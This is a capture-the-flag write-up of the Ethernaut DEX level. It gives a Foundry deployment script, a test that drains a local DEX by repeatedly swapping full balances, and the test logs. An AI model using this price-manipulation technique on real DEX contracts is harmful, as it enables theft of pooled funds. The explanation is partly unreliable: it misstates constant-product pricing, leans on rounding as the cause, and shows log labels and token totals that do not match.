This is my analysis and solution for the DEX - 22 - challenge of ethernaut.

link:https://ethernaut.openzeppelin.com/level/22

The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.
You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.

Go on the link and try find the vulnerability first !


---

### **My simple analysis** 🔍
1 - getSwapPrice is an important function as it provide the amount received during the swap.<br>
2 - getSwapPrice looks not not have precision lost as in solidity multiplication happens before division is the correct way to proceed.<br>
3 - I didn't find any vulnerability in the code therefore I put my hand dirty.<br>
4 - My goal at the point was only to test the the swap function and check the output.<br><br>

#### 1 - First let's deploy the contract

initialization of the project
```bash
forge init
forge install OpenZeppelin/openzeppelin-contracts
anvil
```

deployment script
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


import "forge-std/Script.sol";
import "../src/dex.sol";
contract DeployDex is Script {
function run() external {
uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
address deployer = vm.addr(deployerPrivateKey);
vm.startBroadcast(deployerPrivateKey);

// Deploy the DEX contract

Dex dex = new Dex();
console.log("DEX deployed at:", address(dex));

// Deploy token1

SwappableToken token1 = new SwappableToken(
address(dex),
"Token1",
"TK1",
1000 * 10**18 // 1000 tokens with 18 decimals
);

console.log("Token1 deployed at:", address(token1));


// Deploy token2
SwappableToken token2 = new SwappableToken(
address(dex),
"Token2",
"TK2",
1000 * 10**18 // 1000 tokens with 18 decimals
);
console.log("Token2 deployed at:", address(token2));

// Set tokens in DEX
dex.setTokens(address(token1), address(token2));
console.log("Tokens set in DEX");

// Approve DEX to spend tokens from deployer account
token1.approve(deployer, address(dex), 1000 * 10**18);
token2.approve(deployer, address(dex), 1000 * 10**18);


// Add liquidity: 100 token1 and 100 token2
dex.addLiquidity(address(token1), 100 * 10**18);
dex.addLiquidity(address(token2), 100 * 10**18);
console.log("Added 100 token1 and 100 token2 to liquidity pools");
vm.stopBroadcast();
}
}
```
broadcast the tx on chain and deploy the contract
```bash
forge script script/DeployDex.s.sol --rpc-url http://127.0.0.1:8545 --broadcast

[⠊] Compiling...
[⠔] Compiling 1 files with Solc 0.8.30
[⠒] Solc 0.8.30 finished in 449.80ms
Compiler run successful!
Script ran successfully.

== Logs ==
DEX deployed at: 0x5FbDB2315678afecb367f032d93F642f64180aa3
Token1 deployed at: 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
Token2 deployed at: 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0
Tokens set in DEX
Added 100 token1 and 100 token2 to liquidity pools

## Setting up 1 EVM.

==========================

Chain 31337

Estimated gas price: 2.000000001 gwei
Estimated total gas used for script: 2746239
Estimated amount required: 0.005492478002746239 ETH
```
Everything looks good, let's create a test file, the goal is to test the swap function.<br>
I've no version of my initial test file but I figured out that during the swap process, when I was swapping 10 token1 I received actually more than 10 token2 which is wrong as x * y = k.
This mean that for 1 token1 swapped I should received onnly 1 token2.

Final test file:

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/dex.sol";

contract SwapTest is Test {
    Dex public dex;
    SwappableToken public token1;
    SwappableToken public token2;

    address public user = address(0x123);
    uint256 public constant SWAP_AMOUNT = 10 * 1e18;

    // === Helper Functions ===

    /// @dev Swaps the user's entire balance of tokenIn for tokenOut
    function swapMax(SwappableToken tokenIn, SwappableToken tokenOut) internal {
        uint256 balance = tokenIn.balanceOf(user);
        require(balance > 0, "No tokens to swap");
        dex.swap(address(tokenIn), address(tokenOut), balance);
    }

    // === Setup ===

    function setUp() public {
        // Deploy contracts
        dex = new Dex();
        token1 = new SwappableToken(address(dex), "Token1", "TK1", 1000 * 1e18);
        token2 = new SwappableToken(address(dex), "Token2", "TK2", 1000 * 1e18);

        // Configure DEX
        dex.setTokens(address(token1), address(token2));

        // Add liquidity
        token1.approve(address(this), address(dex), 1000 * 1e18);
        token2.approve(address(this), address(dex), 1000 * 1e18);
        dex.addLiquidity(address(token1), 100 * 1e18);
        dex.addLiquidity(address(token2), 100 * 1e18);

        // Fund user
        token1.transfer(user, 10 * 1e18);
        token2.transfer(user, 10 * 1e18);
    }

    // === Tests ===

    function testSwap() public {
        vm.startPrank(user);

        // Log initial balances
        uint256 initialToken1 = token1.balanceOf(user);
        uint256 initialToken2 = token2.balanceOf(user);
        uint256 initialDexToken1 = token1.balanceOf(address(dex));
        uint256 initialDexToken2 = token2.balanceOf(address(dex));

        console.log("=== BEFORE SWAP ===");
        console.log("User Token1:", initialToken1 / 1e18);
        console.log("User Token2:", initialToken2 / 1e18);
        console.log("DEX Token1:", initialDexToken1 / 1e18);
        console.log("DEX Token2:", initialDexToken2 / 1e18);

        // Approve DEX
        token1.approve(user, address(dex), 9000 * 1e18);
        token2.approve(user, address(dex), 9000 * 1e18);

        // Preview swap
        uint256 expected = dex.getSwapPrice(address(token1), address(token2), SWAP_AMOUNT);
        console.log("Expected Token2 from swap:", expected / 1e18);

        console.log("\n=== PERFORMING MAX SWAPS ===");

        // Perform swaps
        console.log("Swapping all", token1.balanceOf(user) / 1e18, "Token1 for Token2");
        swapMax(token1, token2);

        console.log("Swapping all", token2.balanceOf(user) / 1e18, "Token2 for Token1");
        swapMax(token2, token1);

        console.log("Swapping all", token1.balanceOf(user) / 1e18, "Token1 for Token2");
        swapMax(token1, token2);

        console.log("Swapping all", token2.balanceOf(user) / 1e18, "Token2 for Token1");
        swapMax(token2, token1);

        // Log final balances
        uint256 finalToken1 = token1.balanceOf(user);
        uint256 finalToken2 = token2.balanceOf(user);
        uint256 finalDexToken1 = token1.balanceOf(address(dex));
        uint256 finalDexToken2 = token2.balanceOf(address(dex));

        console.log("\n=== AFTER SWAP ===");
        console.log("User Token1:", finalToken1 / 1e18);
        console.log("User Token2:", finalToken2 / 1e18);
        console.log("DEX Token1:", finalDexToken1 / 1e18);
        console.log("DEX Token2:", finalDexToken2 / 1e18);

        vm.stopPrank();
    }
}
```
output
```bash
forge test --match-test testSwap -vv
[⠊] Compiling...
[⠒] Compiling 1 files with Solc 0.8.30
[⠘] Solc 0.8.30 finished in 558.99ms
Compiler run successful!

Ran 1 test for test/SwapTest.t.sol:SwapTest
[PASS] testSwap() (gas: 224112)
Logs:
  === BEFORE SWAP ===
  User Token1 balance: 10
  User Token2 balance: 10
  DEX Token1 balance: 100
  DEX Token2 balance: 100
  Expected swap amount (Token2): 10
  
=== PERFORMING MAX SWAPS ===
  Swapping all 10 Token1 for Token2
  Swapping all 20 Token2 for Token1
  Swapping all 24 Token1 for Token2
  Swapping all 31 Token2 for Token1
  
=== AFTER SWAP ===
  User Token1 balance: 43
  User Token2 balance: 0
  DEX Token1 balance: 66
  DEX Token2 balance: 110

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.39ms (494.57µs CPU time)

Ran 1 test suite in 9.48ms (1.39ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

And here we go... After multiple swaps it clearly shows that the getSwapPrice is incorectly implemented, **but why?**

This DEX doesn't use an external oracle like Chainlink or Uniswap's TWAP. Instead, it calculates prices based on token balances — a mechanism we can exploit.

Due to Solidity's rounding down in integer division (e.g., 5/2 = 2, not 2.5), small trades can yield 0 tokens in return. For example, selling 1 token1 when token2 * amount < token1 results in getting nothing back.


Takeaway : **NEVER USE BALANCE AS A FACTOR TO CALCULATE PRICE OF TOKENS**

Thank you reading, happy hacking 🧑‍💻 ! 


Finished the challenge and felt kinda dumb for missing the rounding error — just did a quick eyeball review and thought, “Yeah, looks fine,” while Solidity quietly floored everything behind my back.
ALWAYS PUT YOUR HANDS DIRTY.
